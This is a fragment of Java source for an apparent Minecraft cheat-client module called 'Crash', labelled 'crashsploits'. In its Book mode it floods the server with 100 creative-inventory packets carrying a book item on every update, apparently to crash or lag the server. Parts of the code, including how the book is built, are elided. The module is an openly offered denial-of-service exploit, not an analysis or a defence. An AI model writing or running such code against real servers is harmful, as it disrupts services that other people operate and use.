...
public class Crash extends Module
{
    ...
    public Crash() {
        super("Crash", "crashsploits ABOBA", Category.PLAYER, true, false, false);
        this.mode = (Setting<Mode>)this.register(new Setting("Mode", (T)Mode.Book));
    }
    
    @Override
    public void onUpdate() {
        if (this.mode.getValue() == Mode.Book && Crash.mc.world != null && Crash.mc.player != null) {
            ...
            for (int i = 0; i < 100; ++i) {
                if (Crash.mc.player.isSpectator()) {
                    break;
                }
                Crash.mc.getConnection().sendPacket((Packet)new CPacketCreativeInventoryAction(0, book));
            }
        }
    }
